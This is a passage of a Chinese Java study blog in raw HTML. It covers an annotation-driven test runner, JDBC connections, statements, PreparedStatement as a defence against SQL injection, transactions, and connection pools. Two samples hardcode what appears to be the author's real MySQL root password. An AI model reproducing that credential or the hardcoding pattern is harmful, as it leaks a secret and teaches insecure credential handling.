class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;1-0=&quot;</span>+(<span class="hljs-number">1</span>-<span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-meta">@Check</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mul</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;1*0=&quot;</span>+(<span class="hljs-number">1</span>*<span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-meta">@Check</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">div</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;1/0=&quot;</span>+(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;无bug&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//check.java</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Check &#123;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//测试类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, IOException &#123;<br>    <span class="hljs-comment">//一个简单的测试框架</span><br>    Calculator c=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Calculator</span>();<br>    <span class="hljs-comment">//获取字节码对象</span><br>    Class cls=c.getClass();<br>    <span class="hljs-comment">//获取所有方法</span><br>    Method[] methods = cls.getMethods();<br>    <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<span class="hljs-comment">//出现异常的次数</span><br>    BufferedWriter bw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;bug.txt&quot;</span>));<br>    <span class="hljs-keyword">for</span>(Method m:methods)<br>    &#123;<br>        <span class="hljs-comment">//判断方法上是否有Check注解</span><br>        <span class="hljs-keyword">if</span>(m.isAnnotationPresent(Check.class))&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                m.invoke(c);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-comment">//捕获异常</span><br>                <span class="hljs-comment">//记录文件信息</span><br>                num++;<br>                bw.write(m.getName()+<span class="hljs-string">&quot;方法出异常了&quot;</span>);<br>                bw.newLine();<br>                bw.write(<span class="hljs-string">&quot;异常的名称：&quot;</span>+e.getCause().getClass().getSimpleName());<span class="hljs-comment">//得到异常简短类名（不带包名）</span><br>                bw.newLine();<br>                bw.write(<span class="hljs-string">&quot;异常的原因：&quot;</span>+e.getCause().getMessage());<br>                bw.newLine();<br>                bw.write(<span class="hljs-string">&quot;-------------&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    bw.write(<span class="hljs-string">&quot;本次出现&quot;</span>+num+<span class="hljs-string">&quot;次异常&quot;</span>);<br>    bw.flush();<br>    bw.close();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="JDBC–Java数据库连接"><a href="#JDBC–Java数据库连接" class="headerlink" title="JDBC–Java数据库连接"></a>JDBC–Java数据库连接</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>使用统一的一套java代码可以操作所有的关系型数据库</p><p>JDBC:定义了操作所有关系型数据库的规则（接口）</p><p>JDBC本质：官方（sun公司）定义的一套操作所有关系型数据库的规则，即接口，各个数据库厂商趣实现这套接口，提供数据库驱动jar包。我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动jar包中的实现类</p><blockquote><p>数据库驱动：即JDBC实现类（按数据库分），由各数据库产商自己提供对应版本</p></blockquote><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ul><li>导入驱动jar包<ul><li>复制jar包到项目的libs(自定义)目录下</li><li>右键–&gt;Add As Library</li></ul></li><li>注册驱动</li><li>获取数据库连接对象 Connection</li><li>定义sql</li><li>获取执行sql语句的对象 Statement</li><li>执行sql，接受返回结果</li><li>处理结果</li><li>释放资源</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//导入驱动jar包</span><br>    <span class="hljs-comment">//注册驱动</span><br>    Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    <span class="hljs-comment">//获取连接对象</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;ZLL05311223&quot;</span>);<br>    <span class="hljs-comment">//定义sql语句</span><br>    String sql=<span class="hljs-string">&quot;update mystudy set id=4781 where value=1243&quot;</span>;<br>    <span class="hljs-comment">//获取执行sql的对象</span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//执行sql</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> stmt.executeUpdate(sql);<br>    <span class="hljs-comment">//处理结果</span><br>    System.out.println(count);<br>    <span class="hljs-comment">//释放资源</span><br>    stmt.close();<br>    conn.close();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现类详解"><a href="#实现类详解" class="headerlink" title="实现类详解"></a>实现类详解</h2><h3 id="DriverManager"><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h3><p>驱动管理对象</p><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li><p>注册驱动:告诉程序使用哪一个数据库驱动jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//写代码时</span><br>Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<span class="hljs-comment">//类的字节码文件加载进内存</span><br><span class="hljs-comment">//注册驱动静态方法</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerDriver</span><span class="hljs-params">(Driver driver)</span>:注册与给定的驱动程序 DriverManager<br></code></pre></td></tr></table></figure><blockquote><p>通过查看源码发现在com.mysql.cj.jdbc.Driver类中存在静态代码块，在其中运行了注册驱动静态方法，该静态代码块在类的字节码加载进内存时自动运行</p><p>⚠️：其实加载类这一步在mysql5后的驱动jar包已经帮我们先加载了，可以不写</p></blockquote></li><li><p>获取数据库连接</p><ul><li><p>方法ststic Connection getConnection(String url,String user,String password)</p></li><li><p>参数：</p><ul><li><p>url：指定链接的路径</p><ul><li><p>语法 <code>jdbc:mysql://ip地址(域名):端口号/数据库名称</code> (以mysql为例，不同数据库语法不一样)</p><blockquote><p>如果连接的是本机mysql，并且端口为3306，可以简写为 <code>jdbc:mysql:///数据库名称</code></p></blockquote></li></ul></li><li><p>user 用户名</p></li><li><p>password 密码</p></li></ul></li></ul></li></ul><h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p>数据库连接对象</p><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><ul><li>获取执行sql的对象<ul><li>Statement createStatement()</li><li>PrepareStatement prepareStatement(String sql)</li></ul></li><li>管理事务：<ul><li>开启事务 void setAutoCommit(boolean autoCommit) :调用该方法设置参数为false，即开启事务</li><li>提交事务 void commit()</li><li>回滚事务 void rollback()</li></ul></li></ul><h3 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h3><p>执行sql对象(静态sql)</p><ul><li>执行sql<ul><li>boolean execute(String sql) ：可以执行任意sql （不常用）</li><li>int executeUpdate(String sql) ：可以执行DML（增删改）语句、DDL（create, alter,drop）语句。返回值是影响的行数，若返回值&gt;0则执行成功</li><li>ResultSet executeQuery(String sql) ：执行DQL(select)语句</li></ul></li></ul><h3 id="ResultSet"><a href="#ResultSet" class="headerlink" title="ResultSet"></a>ResultSet</h3><p>结果集对象，封装查询结果</p><ul><li>next() 游标向下移动一行，返回布尔类型，判断当前行是否有数据，true为有数据</li><li>getXxxx(参数) 获取数据 (Xxxx表示数据类型) e.g. getInt()<ul><li>参数<ul><li>int型 表示列的编号，从左到右 从1开始</li><li>String型 表示列名称</li></ul></li></ul></li></ul><h4 id="遍历实例"><a href="#遍历实例" class="headerlink" title="遍历实例"></a>遍历实例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (rs.next())&#123;<br>    <span class="hljs-comment">//循环判断是否有数据</span><br>    <span class="hljs-comment">//获取数据</span><br>    <span class="hljs-type">int</span> id=rs.getInt(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> rs.getString(<span class="hljs-string">&quot;name&quot;</span>);<br>    <span class="hljs-type">double</span> balance=rs.getDouble(<span class="hljs-number">3</span>);<br>    System.out.println(id+<span class="hljs-string">&quot;---&quot;</span>+name+<span class="hljs-string">&quot;---&quot;</span>+balance);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><p>执行sql对象，功能更强大(预编译的sql语句)</p><p>解决sql注入问题</p><p>预编译sql:参数使用?作为占位符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">String <span class="hljs-keyword">sql</span><span class="hljs-operator">=</span>&quot;select * from user where username=? and password=?&quot;<br></code></pre></td></tr></table></figure><p>获取执行sql语句的对象</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">PreparedStatement Connection.prepareStatement(String <span class="hljs-keyword">sql</span>)<br></code></pre></td></tr></table></figure><p>给？赋值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">setXxxx</span><span class="hljs-params">(参数<span class="hljs-number">1</span>,参数<span class="hljs-number">2</span>)</span></span><br>Xxxx是当前位置参数的数据类型<br>参数<span class="hljs-number">1</span>: ？的位置编号，从<span class="hljs-number">1</span>开始<br>参数<span class="hljs-number">2</span>:？的值<br></code></pre></td></tr></table></figure><p>执行sql，不需要传递sql，该类有空参executexxx()方法</p><blockquote><p>这种情况下再sql注入会被防御，推荐使用该类完成增删改查</p></blockquote><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//修改一条记录</span><br><span class="hljs-comment">//提升要释放资源的作用域</span><br><span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>    conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql:///test&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;ZLL05311223&quot;</span>);<span class="hljs-comment">//抛出异常选择add catch...</span><br>    String sql=<span class="hljs-string">&quot;update mystudy set value=&#x27;诗情画奕&#x27; where id=339&quot;</span>;<br>    <span class="hljs-comment">//获取执行sql对象</span><br>    stmt = conn.createStatement();<br>    <span class="hljs-type">int</span> count=stmt.executeUpdate(sql);<br>    <span class="hljs-comment">//处理结果</span><br>    System.out.println(count);<br>    <span class="hljs-keyword">if</span>(count&gt;<span class="hljs-number">0</span>) &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改成功&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改失败&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    e.printStackTrace();<br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>    e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span> &#123;<br>    <span class="hljs-comment">//释放资源</span><br>    <span class="hljs-keyword">if</span>(stmt!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            stmt.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(conn!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h2 id="抽取工具类"><a href="#抽取工具类" class="headerlink" title="抽取工具类"></a>抽取工具类</h2><p>可以简化书写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//自定义工具类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcUtil</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  String url;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  String user;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  String password;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String driver;<br>    <span class="hljs-comment">//文件读取只需要一次  静态代码块</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-comment">//读取资源文件，获取值</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//创建Properties集合类</span><br>            Properties pro=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>            <span class="hljs-comment">//获取src路径下文件但方式--&gt;ClassLoader 类加载器</span><br>            ClassLoader c=JdbcUtil.class.getClassLoader();<br>            URL res=c.getResource(<span class="hljs-string">&quot;jdbc.properties&quot;</span>);<span class="hljs-comment">//返回URL对象，表示统一资源标识符号</span><br>            String path=res.toURI().getPath();<span class="hljs-comment">//得到路径,使用toURI需要try catch异常</span><br>            <span class="hljs-comment">//加载文件</span><br>            <span class="hljs-comment">//pro.load(new FileReader(&quot;src/jdbc.properties&quot;));</span><br>            pro.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(path));<br>            <span class="hljs-comment">//获取数值 赋值</span><br>            url=pro.getProperty(<span class="hljs-string">&quot;url&quot;</span>);<br>            user=pro.getProperty(<span class="hljs-string">&quot;user&quot;</span>);<br>            password=pro.getProperty(<span class="hljs-string">&quot;password&quot;</span>);<br>            driver=pro.getProperty(<span class="hljs-string">&quot;driver&quot;</span>);<br>            <span class="hljs-comment">//注册驱动</span><br>            Class.forName(driver);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (URISyntaxException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//获取连接</span><br>    <span class="hljs-comment">//不传递参数，但还要保证工具类通用性</span><br>    <span class="hljs-comment">//使用配置文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnention</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">return</span> DriverManager.getConnection(url,user,password);<br>    &#125;<br>    <span class="hljs-comment">//释放资源</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">(Statement stmt,Connection conn)</span>&#123;<br>        <span class="hljs-keyword">if</span>(stmt!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                stmt.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(conn!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">(ResultSet rs,Statement stmt, Connection conn)</span>&#123;<br>        <span class="hljs-keyword">if</span>(rs!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                rs.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(stmt!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                stmt.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(conn!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn.close();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>静态代码块只能用静态成员变量、静态成员方法</p><p>静态代码块只能处理异常（try catch） 不能抛异常（throws）</p><p>只有在src目录下文件才能通过类加载器获取资源</p></blockquote><h2 id="控制事务"><a href="#控制事务" class="headerlink" title="控制事务"></a>控制事务</h2><p>事务：一个包含多个步骤的业务操作，如果这个业务操作被事务管理，则这多个步骤要么同时成功，要么同时失败</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>开启事务</li><li>提交事务</li><li>回滚事务</li></ul><h3 id="使用Connection对象管理事务"><a href="#使用Connection对象管理事务" class="headerlink" title="使用Connection对象管理事务"></a>使用Connection对象管理事务</h3><ul><li>开启事务 void setAutoCommit(boolean autoCommit) :调用该方法设置参数为false，即开启事务 (执行sql前)</li><li>提交事务 void commit()。（sql都执行完）</li><li>回滚事务 void rollback() （catch异常中）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//事务操作</span><br>Connection conn=<span class="hljs-literal">null</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt1</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt2</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//获取连接</span><br>    conn=JdbcUtil.getConnention();<br>    <span class="hljs-comment">//开启事务</span><br>    conn.setAutoCommit(<span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//定义sql</span><br>    String sql1=<span class="hljs-string">&quot;update mystudy set value =value-? where id=?&quot;</span>;<br>    String sql2=<span class="hljs-string">&quot;update mystudy set value =value+? where id=?&quot;</span>;<br>    <span class="hljs-comment">//获取执行sql对象</span><br>    pstmt1= conn.prepareStatement(sql1);<br>    <span class="hljs-comment">//手动制造异常</span><br>    <span class="hljs-type">int</span> i=<span class="hljs-number">3</span>/<span class="hljs-number">0</span>;<br>    pstmt2= conn.prepareStatement(sql2);<br>    <span class="hljs-comment">//设置参数</span><br>    pstmt1.setDouble(<span class="hljs-number">1</span>,<span class="hljs-number">500</span>);<br>    pstmt1.setInt(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);<br>    pstmt2.setDouble(<span class="hljs-number">1</span>,<span class="hljs-number">500</span>);<br>    pstmt2.setInt(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>    pstmt1.executeUpdate();<br>    pstmt2.executeUpdate();<br>    <span class="hljs-comment">//提交事务</span><br>    conn.commit();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    <span class="hljs-comment">//事务回滚</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span>(conn!=<span class="hljs-literal">null</span>) &#123;<br>            conn.rollback();<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>        ex.printStackTrace();<br>    &#125;<br>    e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span> &#123;<br>    JdbcUtil.close(pstmt1,conn);<br>    JdbcUtil.close(pstmt2,<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>可以防止代码因bug中断没有完成所有sql的执行</p></blockquote><h2 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>其实就是一个容器（集合），存放数据库连接的容器。当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，用户访问完之后，会将连接对象归还给容器</p><blockquote><p>好处</p><ul><li>节约资源</li><li>用户访问高效</li></ul></blockquote><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>标准接口：DataSource javax.sql包下</p><ul><li>方法：<ul><li>获取连接:getConnection()</li><li>归还连接：如果连接对象Connection是从连接池中获取，调用Connention.close()方法是归还连接</li></ul></li></ul><p>一般不实现，由数据库厂商实现</p><ul><li>C3P0:数据库连接池技术</li><li>Druid：数据库连接池技术，阿里巴巴提供</li></ul><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><ul><li>导入jar包 两个  mchange-commons-java-0.2.12.jar c3p0-0.9.5.2.jar 以及数据库驱动jar包</li><li>定义配置文件<ul><li>名称：c3p0.properties 或者 c3p0-config.xml</li><li>路径：直接放在src目录下</li></ul></li><li>创建核心对象 数据库连接池对象 ComboPooledDataSource</li><li>获取连接 getConnection</li></ul><h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><h4 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h4><ul><li>导入jar包 druid-1.0.9.jar 以及数据库驱动jar包</li><li>定义配置文件<ul><li>properties形式</li><li>可以叫任意名称，可以放任意目录</li></ul></li><li>获取数据库连接池对象： 通过工厂类获取 DruidDataSourceFactory</li><li>获取连接</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//加载配置文件</span><br><span class="hljs-type">Properties</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 